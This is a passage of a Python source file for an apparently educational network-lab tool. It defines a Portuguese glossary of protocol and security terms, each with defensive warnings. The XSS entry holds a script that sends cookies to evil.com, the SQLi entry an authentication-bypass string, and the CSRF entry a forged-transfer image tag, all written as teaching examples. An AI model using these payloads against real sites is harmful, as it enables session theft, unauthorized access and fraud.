# interface/glossario.py
# Glossário interativo do Modo Análise — NetLab Educacional
#
# Fornece:
#   GLOSSARIO        — dicionário de termos técnicos com definições didáticas
#   marcar_termos()  — injeta links clicáveis no HTML da análise
#   JanelaGlossario  — modal contextual de exibição da definição

import re

from PyQt6.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, QFrame,
    QApplication,
)
from PyQt6.QtCore import Qt, QEvent
from PyQt6.QtGui import QCursor

# ══════════════════════════════════════════════════════════════
# PALETA — mesmos tokens do painel_eventos.py
# ══════════════════════════════════════════════════════════════

_BG2     = "#0d1120"
_CARD    = "#0b0f1e"
_BORDA   = "#182038"
_BORDA2  = "#1f2e4a"
_ACCENT2 = "#57b2e2"
_TEXTO2  = "#a6bccb"
_MUTED   = "#5f7489"
_DIM     = "#354e63"
_AVISO   = "#cf832a"
_CRITICO = "#de4f4f"

# ══════════════════════════════════════════════════════════════
# DICIONÁRIO DO GLOSSÁRIO
# Estrutura de cada entrada:
#   titulo       — nome completo (ex: "TLS — Transport Layer Security")
#   definicao    — o que é o conceito
#   finalidade   — para que serve na prática
#   exemplo      — caso concreto (opcional)
#   alerta       — aviso de segurança quando relevante (opcional)
#   cor_alerta   — cor do alerta (_AVISO ou _CRITICO)
# ══════════════════════════════════════════════════════════════

GLOSSARIO: dict[str, dict] = {

    # ── Protocolos de aplicação ───────────────────────────────

    "HTTP": {
        "titulo": "HTTP — HyperText Transfer Protocol",
        "definicao": (
            "Protocolo de camada de aplicação que transfere páginas web e dados "
            "entre cliente e servidor em texto completamente legível — sem nenhuma "
            "criptografia. Criado por Tim Berners-Lee em 1989."
        ),
        "finalidade": (
            "Base da comunicação na Web. Opera na porta 80 por padrão. "
            "Todo acesso a um site usa HTTP ou sua versão segura, o HTTPS."
        ),
        "exemplo": (
            "Ao acessar http://example.com, o navegador envia GET / HTTP/1.1 "
            "ao servidor na porta 80. A resposta — incluindo cookies e formulários "
            "— trafega em texto claro, visível a qualquer sniffer na rede."
        ),
        "alerta": (
            "Senhas, cookies e dados de formulário ficam completamente expostos. "
            "Use HTTPS. Nunca envie credenciais por HTTP."
        ),
        "cor_alerta": _CRITICO,
    },

    "HTTPS": {
        "titulo": "HTTPS — HTTP Secure",
        "definicao": (
            "Versão segura do HTTP que encapsula todo o tráfego dentro de uma "
            "sessão TLS, criptografando o conteúdo da comunicação de ponta a ponta."
        ),
        "finalidade": (
            "Garante confidencialidade (criptografia), integridade (proteção contra "
            "alteração) e autenticação do servidor (certificado digital). "
            "Opera na porta 443. O sniffer só vê o SNI no ClientHello inicial."
        ),
        "exemplo": (
            "Ao acessar https://banco.com, o navegador negocia TLS com o servidor. "
            "O extrato, a senha e os cookies trafegam completamente cifrados — "
            "o sniffer vê apenas que você acessou 'banco.com'."
        ),
    },

    "DNS": {
        "titulo": "DNS — Domain Name System",
        "definicao": (
            "Sistema hierárquico e distribuído que traduz nomes de domínio "
            "(ex: google.com) em endereços IP numéricos que os roteadores entendem."
        ),
        "finalidade": (
            "Funciona como a agenda telefônica da internet. Sem DNS, seria "
            "necessário memorizar IPs para acessar qualquer serviço. "
            "Opera geralmente via UDP na porta 53."
        ),
        "exemplo": (
            "Ao digitar github.com, seu sistema envia uma query DNS ao servidor "
            "configurado (ex: 8.8.8.8) perguntando: 'Qual é o IP de github.com?' "
            "O servidor responde com o IP e o navegador abre a conexão."
        ),
    },

    "ARP": {
        "titulo": "ARP — Address Resolution Protocol",
        "definicao": (
            "Protocolo que mapeia endereços IP (camada 3 / rede) para endereços "
            "MAC (camada 2 / enlace) dentro de uma rede local (LAN). "
            "Opera exclusivamente dentro do segmento de rede local."
        ),
        "finalidade": (
            "Permite que dispositivos na mesma rede se encontrem fisicamente. "
            "Funciona via broadcast: o dispositivo pergunta 'Quem tem o IP X? "
            "Me diga seu MAC' — e todos os hosts da rede recebem a pergunta."
        ),
        "exemplo": (
            "Antes de enviar dados para 192.168.1.1, o PC envia ARP broadcast. "
            "O roteador responde: 'Sou eu. Meu MAC é AA:BB:CC:DD:EE:FF.' "
            "O PC armazena isso no cache ARP e envia os pacotes direto ao MAC."
        ),
        "alerta": (
            "ARP Spoofing: um atacante responde falsamente ao ARP fingindo ser "
            "o gateway, redirecionando todo o tráfego para si — base dos ataques MITM."
        ),
        "cor_alerta": _AVISO,
    },

    "ICMP": {
        "titulo": "ICMP — Internet Control Message Protocol",
        "definicao": (
            "Protocolo de camada de rede usado para enviar mensagens de controle, "
            "diagnóstico e erro entre dispositivos IP. Não transporta dados de "
            "aplicação — é exclusivamente de sinalização."
        ),
        "finalidade": (
            "Base do comando ping (Echo Request/Reply) e traceroute (Time Exceeded). "
            "Notifica erros como host inacessível, porta fechada ou TTL esgotado."
        ),
        "exemplo": (
            "ping 8.8.8.8 envia ICMP Echo Request ao servidor do Google. "
            "O servidor responde com Echo Reply — confirmando conectividade e "
            "informando a latência (round-trip time)."
        ),
    },

    "TCP": {
        "titulo": "TCP — Transmission Control Protocol",
        "definicao": (
            "Protocolo de transporte orientado à conexão que garante entrega "
            "ordenada, sem perda e sem duplicata de dados, usando confirmações (ACK) "
            "e retransmissão automática em caso de falha."
        ),
        "finalidade": (
            "Base de HTTP, HTTPS, SSH, FTP, SMB e outros protocolos que exigem "
            "confiabilidade. Usa o three-way handshake (SYN → SYN-ACK → ACK) "
            "para estabelecer a conexão antes de qualquer dado."
        ),
        "exemplo": (
            "Ao abrir uma página web, o navegador faz handshake TCP com o servidor "
            "antes de qualquer dado HTTP. Se um pacote se perder, TCP detecta e "
            "retransmite automaticamente."
        ),
    },

    "UDP": {
        "titulo": "UDP — User Datagram Protocol",
        "definicao": (
            "Protocolo de transporte sem conexão que não garante entrega, "
            "ordenação ou detecção de duplicatas — mas tem latência muito menor "
            "que o TCP por não ter overhead de confirmação."
        ),
        "finalidade": (
            "Usado em DNS, streaming de vídeo, jogos online, VoIP e DHCP. "
            "A velocidade compensa a perda eventual de pacotes nesses cenários."
        ),
        "exemplo": (
            "Uma query DNS usa UDP porta 53. Se o pacote se perder, o cliente "
            "simplesmente reenvia após timeout — mais rápido do que manter uma "
            "conexão TCP para cada consulta."
        ),
    },

    "DHCP": {
        "titulo": "DHCP — Dynamic Host Configuration Protocol",
        "definicao": (
            "Protocolo que distribui automaticamente configurações de rede "
            "(endereço IP, máscara de sub-rede, gateway padrão, servidor DNS) "
            "para dispositivos ao se conectarem à rede."
        ),
        "finalidade": (
            "Elimina a configuração manual de IP em cada dispositivo. "
            "O servidor (geralmente o roteador) mantém um pool de IPs e "
            "os empresta por um período (lease time). Opera nas portas UDP 67/68."
        ),
        "exemplo": (
            "Ao conectar no Wi-Fi, seu celular envia DHCP Discover (broadcast). "
            "O roteador responde com DHCP Offer (ex: IP 192.168.1.100, gateway "
            "192.168.1.1, DNS 8.8.8.8). O celular aceita e a rede é configurada."
        ),
    },

    "SSH": {
        "titulo": "SSH — Secure Shell",
        "definicao": (
            "Protocolo de acesso remoto criptografado que substitui o Telnet. "
            "Todo o tráfego — comandos, senhas, saída — é cifrado do início "
            "ao fim da sessão. Opera na porta 22 por padrão."
        ),
        "finalidade": (
            "Administração segura de servidores remotos, tunelamento de portas, "
            "transferência de arquivos (SCP/SFTP) e execução remota de comandos."
        ),
        "exemplo": (
            "ssh admin@192.168.1.1 abre um terminal criptografado no servidor. "
            "Mesmo capturando todo o tráfego na rede, o sniffer só vê dados "
            "cifrados — impossível recuperar comandos ou senhas."
        ),
    },

    "FTP": {
        "titulo": "FTP — File Transfer Protocol",
        "definicao": (
            "Protocolo para transferência de arquivos que trafega credenciais "
            "e dados em texto completamente claro, sem nenhuma criptografia. "
            "Opera nas portas 20 (dados) e 21 (controle)."
        ),
        "finalidade": (
            "Historicamente usado para upload/download em servidores. "
            "Hoje considerado inseguro e substituído por SFTP (SSH) ou FTPS (TLS)."
        ),
        "exemplo": (
            "ftp ftp.example.com transmite o comando USER admin e PASS senha123 "
            "em texto claro. Qualquer sniffer na mesma rede captura as "
            "credenciais integralmente sem nenhum esforço."
        ),
        "alerta": (
            "Nunca use FTP em redes não confiáveis. "
            "Credenciais ficam completamente expostas ao sniffer. Use SFTP."
        ),
        "cor_alerta": _CRITICO,
    },

    "SMB": {
        "titulo": "SMB — Server Message Block",
        "definicao": (
            "Protocolo de compartilhamento de arquivos, impressoras e recursos "
            "em rede, nativo no Windows. Opera nas portas 445 (direto) e 139 "
            "(sobre NetBIOS)."
        ),
        "finalidade": (
            "Base do compartilhamento de pastas no Windows (\\\\servidor\\pasta). "
            "Também suportado no Linux via Samba. SMBv3 inclui criptografia "
            "nativa; SMBv1 é obsoleto e perigoso."
        ),
        "exemplo": (
            "Mapear uma unidade de rede no Windows usa SMB. "
            "O ataque EternalBlue explorou uma vulnerabilidade no SMBv1 para "
            "propagar o ransomware WannaCry em 2017."
        ),
        "alerta": (
            "Desative SMBv1 imediatamente. Mantenha SMBv2/v3 com "
            "assinatura de pacotes ativa. Não exponha SMB à internet."
        ),
        "cor_alerta": _AVISO,
    },

    "RDP": {
        "titulo": "RDP — Remote Desktop Protocol",
        "definicao": (
            "Protocolo da Microsoft para acesso gráfico remoto a desktops e "
            "servidores Windows, transmitindo a tela, teclado e mouse através "
            "da rede. Opera na porta 3389 por padrão."
        ),
        "finalidade": (
            "Permite controlar um computador Windows remotamente com interface "
            "gráfica completa. Muito usado em suporte técnico e administração "
            "de servidores."
        ),
        "exemplo": (
            "mstsc.exe /v:192.168.1.100 abre sessão RDP. Ataques de força bruta "
            "contra a porta 3389 exposta na internet são extremamente comuns e "
            "frequentemente levam a invasões e ransomware."
        ),
        "alerta": (
            "Nunca exponha RDP diretamente à internet. Use VPN ou Network Level "
            "Authentication (NLA). Ative autenticação de dois fatores."
        ),
        "cor_alerta": _AVISO,
    },

    # ── Segurança e criptografia ──────────────────────────────

    "TLS": {
        "titulo": "TLS — Transport Layer Security",
        "definicao": (
            "Protocolo criptográfico que provê segurança para comunicações na "
            "internet. Sucessor direto do SSL (descontinuado). "
            "As versões atuais recomendadas são TLS 1.2 e TLS 1.3."
        ),
        "finalidade": (
            "Garante três propriedades: confidencialidade (ninguém lê o tráfego), "
            "integridade (ninguém altera sem ser detectado) e autenticação "
            "(o servidor é quem diz ser). É a base do HTTPS, SMTPS, IMAPS."
        ),
        "exemplo": (
            "O indicador de cadeado no navegador indica TLS ativo. TLS 1.3 completa o "
            "handshake em menos round-trips que TLS 1.2, sendo mais rápido e "
            "removendo algoritmos criptográficos legados."
        ),
    },

    "SSL": {
        "titulo": "SSL — Secure Sockets Layer",
        "definicao": (
            "Predecessor do TLS, criado pela Netscape nos anos 90. "
            "Todas as versões SSL (1.0, 2.0, 3.0) estão obsoletas e possuem "
            "vulnerabilidades críticas conhecidas (POODLE, DROWN, BEAST)."
        ),
        "finalidade": (
            "Foi o primeiro protocolo a criptografar conexões web. Hoje o termo "
            "'SSL' é frequentemente usado de forma informal para se referir ao TLS, "
            "mas tecnicamente são protocolos distintos."
        ),
        "alerta": (
            "Não use SSL em nenhuma versão. Configure servidores para "
            "aceitar apenas TLS 1.2 e TLS 1.3."
        ),
        "cor_alerta": _CRITICO,
    },

    "SNI": {
        "titulo": "SNI — Server Name Indication",
        "definicao": (
            "Extensão do protocolo TLS que permite ao cliente informar qual nome "
            "de domínio está acessando durante o ClientHello, antes de a "
            "criptografia ser totalmente estabelecida."
        ),
        "finalidade": (
            "Permite que um servidor hospede múltiplos sites HTTPS no mesmo "
            "endereço IP. O SNI é a única informação legível pelo sniffer em "
            "uma conexão HTTPS — tudo mais é cifrado."
        ),
        "exemplo": (
            "Ao acessar github.com via HTTPS, o ClientHello envia SNI='github.com' "
            "em texto claro para que o servidor saiba qual certificado apresentar. "
            "O conteúdo (código, senhas, tokens) permanece cifrado."
        ),
    },

    "ECDHE": {
        "titulo": "ECDHE — Elliptic Curve Diffie-Hellman Ephemeral",
        "definicao": (
            "Algoritmo de troca de chaves baseado em criptografia de curvas "
            "elípticas que gera uma chave de sessão efêmera (temporária e única) "
            "para cada conexão TLS."
        ),
        "finalidade": (
            "Fornece Perfect Forward Secrecy (PFS): mesmo que a chave privada "
            "do servidor seja comprometida no futuro, sessões passadas registradas "
            "pelo atacante não podem ser decriptadas retroativamente."
        ),
        "exemplo": (
            "Com ECDHE, se um atacante gravar o tráfego HTTPS hoje e roubar a "
            "chave privada do servidor daqui a um ano, os dados gravados "
            "continuam protegidos — cada sessão tem sua própria chave descartável."
        ),
    },

    # ── Conceitos de rede ─────────────────────────────────────

    "TTL": {
        "titulo": "TTL — Time To Live",
        "definicao": (
            "Campo numérico no cabeçalho IP que define quantos roteadores (hops) "
            "o pacote pode atravessar antes de ser descartado. Cada roteador "
            "decrementa o valor em 1; quando chega a 0, o pacote é descartado."
        ),
        "finalidade": (
            "Evita que pacotes circulem indefinidamente na rede em loops de "
            "roteamento. Quando o TTL zera, o roteador envia um ICMP "
            "Time Exceeded de volta ao emissor."
        ),
        "exemplo": (
            "TTL=128 → provável Windows (TTL padrão 128). "
            "TTL=64 → provável Linux/macOS (TTL padrão 64). "
            "Esse valor ajuda a inferir o sistema operacional do host remoto."
        ),
    },

    "MAC": {
        "titulo": "MAC — Media Access Control Address",
        "definicao": (
            "Endereço físico único de 48 bits (ex: AA:BB:CC:DD:EE:FF) gravado "
            "pelo fabricante na interface de rede de cada dispositivo. "
            "Identifica o hardware na camada de enlace (camada 2)."
        ),
        "finalidade": (
            "Usado para entrega de pacotes dentro de uma rede local (LAN). "
            "Os primeiros 3 bytes identificam o fabricante (OUI). "
            "ARP e outros protocolos de camada 2 usam MACs para comunicação."
        ),
        "exemplo": (
            "O MAC 00:1A:2B:xx:xx:xx pertence à Apple. "
            "ARP resolve 'Quem tem o IP 192.168.1.1?' e recebe "
            "o MAC do dispositivo dono desse IP como resposta."
        ),
    },

    "NAT": {
        "titulo": "NAT — Network Address Translation",
        "definicao": (
            "Técnica que traduz endereços IP privados (192.168.x.x, 10.x.x.x) "
            "para um IP público ao sair para a internet, e reverso para o "
            "retorno das respostas."
        ),
        "finalidade": (
            "Permite que múltiplos dispositivos de uma rede local compartilhem "
            "um único IP público. Realizado pelo roteador, resolve o esgotamento "
            "de endereços IPv4."
        ),
        "exemplo": (
            "Seu PC com IP 192.168.1.100 acessa google.com. O roteador substitui "
            "o IP de origem pelo IP público (ex: 187.x.x.x) antes de enviar. "
            "O Google responde ao IP público; o roteador encaminha ao PC certo."
        ),
    },

    "IP": {
        "titulo": "IP — Internet Protocol",
        "definicao": (
            "Protocolo de camada de rede que define o esquema de endereçamento e "
            "o roteamento de pacotes entre redes distintas. "
            "IPv4 usa endereços de 32 bits; IPv6 usa 128 bits."
        ),
        "finalidade": (
            "Todo dispositivo conectado precisa de um endereço IP. "
            "O IP é responsável por levar pacotes da origem ao destino, "
            "possivelmente através de dezenas de roteadores intermediários."
        ),
        "exemplo": (
            "192.168.1.1 é um IPv4 privado (rede local). "
            "8.8.8.8 é um IPv4 público (DNS do Google). "
            "Pacotes IP encapsulam TCP, UDP ou ICMP em seu payload."
        ),
    },

    "VPN": {
        "titulo": "VPN — Virtual Private Network",
        "definicao": (
            "Tecnologia que cria um túnel criptografado entre o dispositivo do "
            "usuário e um servidor remoto, encapsulando todo o tráfego de rede "
            "dentro de um protocolo seguro."
        ),
        "finalidade": (
            "Protege tráfego em redes públicas (Wi-Fi de café, aeroporto), "
            "permite acesso remoto seguro a redes corporativas e pode ocultar "
            "o IP real do usuário frente a serviços externos."
        ),
        "exemplo": (
            "Com VPN activa, um sniffer na rede local só vê tráfego cifrado entre "
            "seu dispositivo e o servidor VPN — o conteúdo real (sites visitados, "
            "dados enviados) fica completamente oculto."
        ),
    },

    "CDN": {
        "titulo": "CDN — Content Delivery Network",
        "definicao": (
            "Rede distribuída geograficamente de servidores que armazena cópias "
            "de conteúdo e os entrega ao usuário a partir do ponto mais próximo, "
            "reduzindo latência e carga no servidor de origem."
        ),
        "finalidade": (
            "Acelera entrega de sites, vídeos e arquivos. Distribui carga. "
            "Aumenta disponibilidade e oferece proteção contra DDoS. "
            "Provedores populares: Cloudflare, Akamai, AWS CloudFront."
        ),
        "exemplo": (
            "Ao assistir Netflix no Brasil, o vídeo vem de um servidor CDN "
            "próximo (ex: São Paulo) — não dos EUA. O IP nos pacotes pertence "
            "à CDN, não à Netflix diretamente."
        ),
    },

    "broadcast": {
        "titulo": "Broadcast (Transmissão em Larga Escala)",
        "definicao": (
            "Modo de transmissão em que um único pacote é enviado para todos os "
            "dispositivos de uma rede ou segmento ao mesmo tempo, sem endereçar "
            "nenhum host específico."
        ),
        "finalidade": (
            "Usado por ARP, DHCP e protocolos de descoberta de serviços. "
            "O endereço de broadcast IPv4 é 255.255.255.255 (global) "
            "ou o último IP da sub-rede (ex: 192.168.1.255)."
        ),
        "exemplo": (
            "ARP envia 'Quem tem 192.168.1.1?' como broadcast — todos os 50 "
            "dispositivos da rede recebem o pacote, mas apenas o dono do IP "
            "192.168.1.1 responde com seu MAC."
        ),
    },

    # ── Flags TCP ─────────────────────────────────────────────

    "SYN": {
        "titulo": "SYN — Synchronize Flag (TCP)",
        "definicao": (
            "Flag do cabeçalho TCP que inicia o processo de estabelecimento de "
            "conexão (three-way handshake). O cliente envia SYN para solicitar "
            "uma nova conexão ao servidor."
        ),
        "finalidade": (
            "Primeiro passo de toda conexão TCP. Um flood de SYN sem completar "
            "o handshake esgota recursos do servidor — esse é o ataque SYN Flood."
        ),
        "exemplo": (
            "Ao abrir uma URL: navegador → SYN → servidor na porta 443. "
            "Servidor → SYN-ACK → navegador. "
            "Navegador → ACK → servidor. Conexão estabelecida."
        ),
    },

    "ACK": {
        "titulo": "ACK — Acknowledgment Flag (TCP)",
        "definicao": (
            "Flag TCP que confirma o recebimento de dados. Acompanha praticamente "
            "todos os pacotes TCP após o SYN inicial, garantindo a entrega confiável."
        ),
        "finalidade": (
            "Se o remetente não receber ACK dentro do timeout, ele retransmite o "
            "pacote automaticamente — é assim que o TCP garante entrega sem perdas."
        ),
        "exemplo": (
            "Após receber 1000 bytes, o receptor envia ACK=1001, indicando: "
            "'Recebi tudo até o byte 1000, envie a partir do byte 1001.'"
        ),
    },

    "FIN": {
        "titulo": "FIN — Finish Flag (TCP)",
        "definicao": (
            "Flag TCP que sinaliza o encerramento ordenado de uma conexão. "
            "Cada lado envia FIN quando terminou de transmitir seus dados, "
            "e espera confirmação (ACK) do outro lado."
        ),
        "finalidade": (
            "Fecha a conexão de forma limpa, garantindo que todos os dados "
            "pendentes foram entregues antes do encerramento. "
            "Diferente do RST, o FIN permite concluir transmissões em andamento."
        ),
        "exemplo": (
            "Ao fechar uma aba: navegador envia FIN ao servidor → servidor "
            "confirma com ACK → servidor envia seu FIN → navegador confirma. "
            "Conexão encerrada de forma ordenada nos dois sentidos."
        ),
    },

    "RST": {
        "titulo": "RST — Reset Flag (TCP)",
        "definicao": (
            "Flag TCP que encerra abruptamente uma conexão sem o handshake de "
            "encerramento normal (FIN-ACK). É uma terminação imediata e forçada."
        ),
        "finalidade": (
            "Usado quando há erro, conexão inválida, rejeição por firewall ou "
            "tentativa de conexão a uma porta fechada. O RST descarta qualquer "
            "dado pendente imediatamente."
        ),
        "exemplo": (
            "Ao tentar conectar a uma porta fechada (ex: porta 8080 sem servidor), "
            "o sistema operacional responde RST instantaneamente, indicando: "
            "'Ninguém está escutando nessa porta.'"
        ),
    },

    # ── Segurança ofensiva ────────────────────────────────────

    "MITM": {
        "titulo": "MITM — Man-in-the-Middle",
        "definicao": (
            "Classe de ataque onde o invasor se insere secretamente entre dois "
            "comunicantes, interceptando e potencialmente lendo, alterando ou "
            "injetando mensagens em ambas as direções."
        ),
        "finalidade": (
            "Permite capturar credenciais, cookies de sessão, injetar conteúdo "
            "malicioso ou redirecionar tráfego. "
            "ARP Spoofing e DNS Spoofing são técnicas comuns para executar MITM."
        ),
        "exemplo": (
            "Com ARP Spoofing, o atacante convence o PC de que seu MAC é o "
            "do gateway — recebendo todo o tráfego antes de repassá-lo. "
            "O usuário não percebe nada anormal."
        ),
        "alerta": (
            "TLS/HTTPS protege contra MITM passivo. MITM ativo requer um "
            "certificado válido — o navegador alerta sobre isso. "
            "Use certificate pinning em aplicações críticas."
        ),
        "cor_alerta": _CRITICO,
    },

    "XSS": {
        "titulo": "XSS — Cross-Site Scripting",
        "definicao": (
            "Vulnerabilidade que permite injetar código JavaScript malicioso em "
            "páginas web, que será executado no navegador de outros usuários "
            "que acessarem a página comprometida."
        ),
        "finalidade": (
            "Explorado para roubar cookies de sessão, redirecionar usuários para "
            "phishing, capturar dados digitados ou executar ações em nome da vítima."
        ),
        "exemplo": (
            "<script>document.location='http://evil.com/?c='+document.cookie</script> "
            "injetado em um campo de comentário envia os cookies de sessão "
            "de todos os visitantes para o servidor do atacante."
        ),
        "alerta": (
            "Sanitize todo input do usuário antes de exibir em HTML. "
            "Implemente Content-Security-Policy (CSP). Use HttpOnly nos cookies."
        ),
        "cor_alerta": _CRITICO,
    },

    "SQLi": {
        "titulo": "SQL Injection (Injeção de SQL)",
        "definicao": (
            "Vulnerabilidade onde input malicioso é inserido em queries SQL sem "
            "sanitização adequada, permitindo que o atacante manipule o banco "
            "de dados da aplicação diretamente."
        ),
        "finalidade": (
            "Permite extrair todos os dados do banco, burlar autenticação, "
            "alterar ou deletar registros, e em alguns casos executar comandos "
            "no sistema operacional (SQL Server: xp_cmdshell)."
        ),
        "exemplo": (
            "No campo de login, digitar: ' OR '1'='1 pode fazer o sistema "
            "retornar 'verdadeiro' para qualquer usuário, concedendo acesso "
            "sem senha válida."
        ),
        "alerta": (
            "Use prepared statements (consultas parametrizadas) — nunca concatene "
            "strings para montar queries. Valide e sanitize todo input."
        ),
        "cor_alerta": _CRITICO,
    },

    "CSRF": {
        "titulo": "CSRF — Cross-Site Request Forgery",
        "definicao": (
            "Vulnerabilidade que permite a um site malicioso forçar o navegador da "
            "vítima a executar ações indesejadas em um site legítimo no qual a "
            "vítima está atualmente autenticada."
        ),
        "finalidade": (
            "Explora a confiança que um site tem no navegador do usuário. Como "
            "os cookies de sessão são enviados automaticamente em todas as requisições "
            "para o site alvo, o servidor executa a ação achando que foi o próprio usuário."
        ),
        "exemplo": (
            "Um site malicioso contém uma tag secreta <img src='http://banco.com/transferir?valor=1000&para=atacante'>. "
            "Ao carregar a página, se o usuário estiver logado no banco, a transferência "
            "ocorre automaticamente sem sua autorização!"
        ),
        "alerta": (
            "Para se defender, use tokens anti-CSRF únicos nas requisições POST "
            "e configure a flag de cookie SameSite como Strict ou Lax."
        ),
        "cor_alerta": _CRITICO,
    },

    "IDOR": {
        "titulo": "IDOR — Insecure Direct Object Reference",
        "definicao": (
            "Falha de controle de acesso que ocorre quando um aplicativo expõe "
            "uma referência direta a um objeto do banco de dados (como um ID na URL) "
            "sem verificar se o usuário atual está autorizado a acessá-lo."
        ),
        "finalidade": (
            "Permite que atacantes acessem ou modifiquem dados de outros usuários "
            "simplesmente alterando o valor do parâmetro identificador de recursos "
            "(como IDs numéricos incrementais)."
        ),
        "exemplo": (
            "Ao acessar seus pedidos na URL `/pedidos?id=1001`, você altera o número "
            "para `/pedidos?id=1002` e consegue visualizar o pedido de outro cliente "
            "sem qualquer restrição de segurança do sistema."
        ),
        "alerta": (
            "Sempre implemente verificações rígidas de autorização no backend. "
            "Use identificadores não previsíveis (como UUIDs) para chaves expostas."
        ),
        "cor_alerta": _CRITICO,
    },

    "Brute Force": {
        "titulo": "Ataque de Força Bruta (Brute Force)",
        "definicao": (
            "Método de ataque cibernético que consiste em tentar exaustivamente todas "
            "as combinações possíveis de credenciais (usuários e senhas) até encontrar "
            "a correta para obter acesso não autorizado."
        ),
        "finalidade": (
            "Usado para invadir contas e quebrar hashes criptográficos. Pode ser automatizado "
            "com ferramentas que testam milhares de senhas por segundo (ataque de dicionário)."
        ),
        "exemplo": (
            "Um script tenta logar em um servidor SSH testando sequencialmente 'admin', "
            "'123456', 'password', etc. O NetLab detectará múltiplos erros de login seguidos, "
            "alertando sobre a tentativa de força bruta no painel do laboratório."
        ),
        "alerta": (
            "Use senhas fortes e complexas, implemente limites de tentativas de login "
            "(rate limiting), bloqueio temporário de IPs suspeitos e autenticação MFA."
        ),
        "cor_alerta": _CRITICO,
    },

    "DNS Spoofing": {
        "titulo": "DNS Spoofing (Envenenamento de Cache)",
        "definicao": (
            "Ataque em que dados DNS falsificados são inseridos no cache do resolvedor DNS, "
            "fazendo com que ele retorne um endereço IP incorreto (geralmente controlado "
            "pelo atacante)."
        ),
        "finalidade": (
            "Redireciona usuários legítimos para sites falsos de phishing (como um banco falso) "
            "sem que percebam, pois a barra de endereços do navegador ainda mostra o domínio "
            "original."
        ),
        "exemplo": (
            "O atacante envenena o cache DNS local associando 'banco.com' ao IP da sua máquina "
            "maliciosa. Quando o cliente tenta acessar o banco, cai no site do atacante."
        ),
        "alerta": (
            "Implemente DNSSEC (assinatura criptográfica de registros DNS) e utilize "
            "provedores de DNS seguros com suporte a DNS-over-HTTPS (DoH)."
        ),
        "cor_alerta": _CRITICO,
    },

    # ── Conceitos e termos técnicos gerais ────────────────────

    "payload": {
        "titulo": "Payload (Carga Útil)",
        "definicao": (
            "Dados úteis transportados por um pacote de rede, excluindo os "
            "cabeçalhos dos protocolos. É o 'conteúdo real' da mensagem — "
            "o que foi enviado, não como foi enviado."
        ),
        "finalidade": (
            "Em segurança, payload também se refere ao código malicioso "
            "carregado por um exploit ou malware. Em redes, é simplesmente "
            "a carga útil do pacote (dados da aplicação)."
        ),
        "exemplo": (
            "Um pacote HTTP POST tem cabeçalhos (método, URL, Content-Type) "
            "e payload (o corpo — o JSON ou formulário enviado). "
            "Em HTTPS, o payload é cifrado; em HTTP, está em texto claro."
        ),
    },

    "handshake": {
        "titulo": "Handshake (Aperto de Mão)",
        "definicao": (
            "Processo de negociação inicial entre cliente e servidor para "
            "estabelecer parâmetros comuns de comunicação antes de trocar "
            "dados reais de aplicação."
        ),
        "finalidade": (
            "O TCP usa three-way handshake (SYN→SYN-ACK→ACK) para conexão. "
            "O TLS adiciona seu próprio handshake para negociar versão, "
            "cifras e autenticar o servidor com certificado digital."
        ),
        "exemplo": (
            "SYN → SYN-ACK → ACK é o handshake TCP (3 passos). "
            "Depois vem o handshake TLS (ClientHello, ServerHello, troca de "
            "chaves, Finished). Só então a aplicação começa a trocar dados."
        ),
    },

    "firewall": {
        "titulo": "Firewall (Barreira de Proteção)",
        "definicao": (
            "Sistema de segurança que monitora e controla o tráfego de rede "
            "de entrada e saída com base em regras predefinidas, "
            "atuando como barreira entre redes confiáveis e não confiáveis."
        ),
        "finalidade": (
            "Bloqueia conexões não autorizadas, protege serviços internos de "
            "exposição indevida e implementa a política de segurança de rede "
            "da organização."
        ),
        "exemplo": (
            "Uma regra: ALLOW TCP 443 FROM any, DENY ALL. "
            "Aceita apenas HTTPS e bloqueia todo o resto, reduzindo drasticamente "
            "a superfície de ataque do servidor."
        ),
    },

    "hexdump": {
        "titulo": "Hexdump (Visualização Hexadecimal)",
        "definicao": (
            "Representação visual de dados binários exibindo cada byte em "
            "hexadecimal (base 16) e seu equivalente ASCII correspondente, "
            "lado a lado, linha por linha."
        ),
        "finalidade": (
            "Permite inspecionar o conteúdo bruto de pacotes byte a byte, "
            "identificar strings escondidas, magic bytes de arquivos, "
            "padrões de protocolo ou dados sensíveis em tráfego HTTP."
        ),
        "exemplo": (
            "48 54 54 50 2f 31 2e 31  HTTP/1.1\n"
            "As colunas da esquerda são os bytes em hex; à direita, "
            "o caractere ASCII — ou ponto (.) para bytes não imprimíveis."
        ),
    },

    "Porta": {
        "titulo": "Porta de Rede (Port)",
        "definicao": (
            "Número de 16 bits (de 1 a 65535) no cabeçalho de transporte (TCP/UDP) "
            "que identifica a qual aplicação ou serviço específico de um computador "
            "um pacote de rede é direcionado."
        ),
        "finalidade": (
            "Permite que o sistema operacional direcione o tráfego de rede para a "
            "aplicação correta. Por exemplo, enquanto o servidor web escuta na porta 80, "
            "o servidor de e-mail pode escutar na porta 25 no mesmo IP."
        ),
        "exemplo": (
            "Ao acessar um site, seu navegador conecta na porta TCP 80 (HTTP) ou "
            "443 (HTTPS) do servidor. A porta de origem do seu PC é gerada de forma "
            "aleatória e alta (ex: 51234) para receber a resposta."
        ),
    },

    "Cookie": {
        "titulo": "Cookie (Cookie de Sessão)",
        "definicao": (
            "Pequeno fragmento de dados gravado no navegador pelo servidor web. "
            "Usado principalmente para lembrar o estado da sessão do usuário "
            "(como se ele está logado ou itens no carrinho de compras)."
        ),
        "finalidade": (
            "Como o protocolo HTTP é stateless (sem estado), o cookie serve "
            "como a identidade do usuário. A cada nova requisição, o navegador "
            "envia o cookie automaticamente para provar quem ele é."
        ),
        "exemplo": (
            "Após fazer login, o servidor envia o header Set-Cookie: sessao=xyz123. "
            "Nas próximas requisições, o navegador envia Cookie: sessao=xyz123. "
            "Se um atacante roubar esse cookie, ele poderá se passar por você."
        ),
        "alerta": (
            "Sempre proteja cookies sensíveis com as flags Secure (exige HTTPS) e "
            "HttpOnly (bloqueia leitura via JavaScript contra ataques XSS)."
        ),
        "cor_alerta": _AVISO,
    },

    "Sniffer": {
        "titulo": "Sniffer (Farejador de Pacotes)",
        "definicao": (
            "Ferramenta (software ou hardware) que intercepta, lê e registra o tráfego "
            "de rede que passa por uma interface de rede, capturando os dados brutos."
        ),
        "finalidade": (
            "Usado para diagnóstico de rede, depuração de protocolos por desenvolvedores "
            "e monitoramento de tráfego. Também é utilizado por atacantes para capturar "
            "dados sensíveis trafegando em texto claro."
        ),
        "exemplo": (
            "O NetLab e o Wireshark funcionam como sniffers. Eles configuram a placa "
